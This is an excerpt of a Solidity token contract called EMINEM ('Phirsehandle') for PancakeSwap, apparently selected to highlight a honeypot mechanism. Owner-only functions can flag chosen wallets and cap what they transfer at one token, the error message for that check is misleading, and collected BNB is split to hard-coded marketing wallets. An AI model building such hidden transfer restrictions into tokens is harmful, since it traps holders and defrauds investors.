...
contract EMINEM is Context, IERC20, Ownable {  
    ...
    string  private _name = "Phirsehandle";
    ...
    uint256 public  _pplamntTrsnsfer = 1;
    ...
    constructor () public {
        ...
        submarketingwallet=0x58639900B265fE5aeF0675C6bDD3D8c18A441Ae5;
    ...
    function _transfer(
        ...
        else if(from != pancakePair && to != pancakePair)
        {
            ...
            TaxType=0;
             ...
             if(_mapHandlePPl[from])
                {
                     require(amount.div(1000000000000000000) <= _pplamntTrsnsfer, "Transfer amount must be greater than given amount");
                }
        ...
        function swapAndLiquify(uint256 contractTokenBalance) private
          {
           ...
           uint256 initialBalance = address(this).balance;
            ...
            uint256 MarketingSend =MarketingBNB.div(2);
            uint256 SubMarketingSend=MarketingBNB.sub(MarketingSend);
            uint256  RewardBNB=SplitBNBBalance.mul(_RewardPer);
            marketingwallet.transfer(MarketingSend);
            submarketingwallet.transfer(SubMarketingSend);
 ...
 function setPPLFunction(address _walletAddr , bool inputamnt) external onlyOwner {
    ...
    function setPPLAmnt(uint256 inmnt) external onlyOwner {
      ...
      function setPPLAmntTransfer(uint256 inmnt) external onlyOwner {
        _pplamntTrsnsfer=inmnt;
    }
